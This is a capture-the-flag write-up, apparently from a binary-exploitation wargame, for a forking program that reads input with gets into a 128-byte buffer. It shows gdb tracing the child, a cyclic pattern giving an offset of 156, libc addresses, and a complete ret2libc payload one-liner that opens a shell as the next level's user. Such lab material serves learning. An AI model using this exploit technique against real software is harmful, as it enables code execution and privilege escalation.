## Project README: Finding flag04
We now have a programe that his creating a child.
the child will use the gets function into a buffer of size 128
and the parents will wait for the child and will puts puts("child is exiting...");

### Analysis
So we understand that will need to make the child segfautl by writing more that 128 char. The difficulty is that if we do that they will not print at wich patern he did segfault and will let stdin open. To quit the program we will have to ctrl-c


### Progress
**We can use gdb to track the son :**
(gdb) set follow-fork-mode child
**then pass the patern**
(gdb) run <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/users/level04/level04 <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[New process 1754]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1754]
0x41326641 in ?? ()
**So the offset is at lengh 156 so we can build the payload by doing a retto lib c**
*address system 0xf7e6aed0  = \xd0\xae\xe6\xf7*
*address exit 0xf7e5eb70 = \x70\xeb\xe5\xf7*
*address /bin/sh 0xf7f897ec = \xec\x97\xf8\xf7*
``Bash
(python -c'print("\x90" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
Give me some shellcode, k
whoami
level05
```
et voila 

